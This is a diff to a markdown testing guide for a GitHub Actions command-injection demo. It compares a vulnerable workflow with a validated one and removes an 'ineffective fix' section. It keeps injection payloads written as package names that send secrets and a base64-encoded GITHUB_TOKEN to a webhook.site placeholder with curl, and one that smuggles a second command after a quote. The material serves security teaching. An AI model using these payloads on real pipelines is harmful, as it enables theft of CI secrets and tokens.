@@ -30,27 +30,9 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
 
 ---
 
-### 2. Command Substitution (BLOCKED by environment variables)
+### 2. Variable Expansion Secret Leak (WORKS on vulnerable workflow)
 
-**Target:** `ineffective-fix.yml`
-
-**Package name:**
-```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?test=envvar)
-```
-
-**Expected result:**
-- ❌ Curl does NOT execute
-- ❌ No webhook request received
-- ✅ Proves environment variables provide protection
-
-**Why it's blocked:** The `${{ }}` expression is evaluated once and stored in the environment variable as a literal string. When the shell later expands `${PACKAGE_NAME}`, it doesn't re-evaluate the command substitution.
-
----
-
-### 3. Variable Expansion Secret Leak (WORKS on both)
-
-**Target:** Both `vulnerable.yml` and `ineffective-fix.yml`
+**Target:** `vulnerable.yml`
 
 **Package name:**
 ```
@@ -70,7 +52,7 @@ fatal: 'update-leaked-super-secret-api-key-12345-1.0.0' is not a valid branch na
 
 ---
 
-### 4. GitHub Token Exfiltration (WORKS on direct interpolation)
+### 3. GitHub Token Exfiltration (WORKS on direct interpolation)
 
 **Target:** `vulnerable.yml`
 
@@ -84,7 +66,7 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID/token-$(echo $GITHUB_TOKEN | base64 
 
 ---
 
-### 5. Multi-Command with File Storage (WORKS on direct interpolation)
+### 4. Multi-Command with File Storage (WORKS on direct interpolation)
 
 **Target:** `vulnerable.yml`
 
@@ -120,12 +102,12 @@ foo"; curl https://webhook.site/YOUR-WEBHOOK-ID #
 
 ### Comparison Matrix
 
-| Attack Payload | vulnerable.yml | ineffective-fix.yml | secure.yml |
-|----------------|----------------|---------------------|------------|
-| `$(curl ...)` | ❌ Executes | ✅ Blocked | ✅ Blocked |
-| `foo"; curl ...` | ✅ Blocked by git | ✅ Blocked by git | ✅ Blocked by validation |
-| `leaked-${SECRET}` | ⚠️ Leaks in logs | ⚠️ Leaks in logs | ✅ Blocked by validation |
-| `` `curl ...` `` | ❌ Executes | ✅ Blocked | ✅ Blocked by validation |
+| Attack Payload | vulnerable.yml | secure.yml |
+|----------------|----------------|------------|
+| `$(curl ...)` | ❌ Executes | ✅ Blocked |
+| `foo"; curl ...` | ✅ Blocked by git | ✅ Blocked by validation |
+| `leaked-${SECRET}` | ⚠️ Leaks in logs | ✅ Blocked by validation |
+| `` `curl ...` `` | ❌ Executes | ✅ Blocked by validation |
 
 ---
 
@@ -206,16 +188,10 @@ env:
 **Input:** `$(curl https://webhook.site/YOUR-ID?test=1)`
 **Result:** ❌ Curl executes, secret stolen
 
-### Test 2: Improved (Environment Variables)
-
-**Workflow:** `ineffective-fix.yml`
-**Input:** `$(curl https://webhook.site/YOUR-ID?test=2)`
-**Result:** ✅ Curl does NOT execute (but validation still missing)
-
-### Test 3: Secure (Environment Variables + Validation)
+### Test 2: Secure (Environment Variables + Validation)
 
 **Workflow:** `secure.yml`
-**Input:** `$(curl https://webhook.site/YOUR-ID?test=3)`
+**Input:** `$(curl https://webhook.site/YOUR-ID?test=2)`
 **Result:** ✅ Validation rejects input, no execution
 
 ---
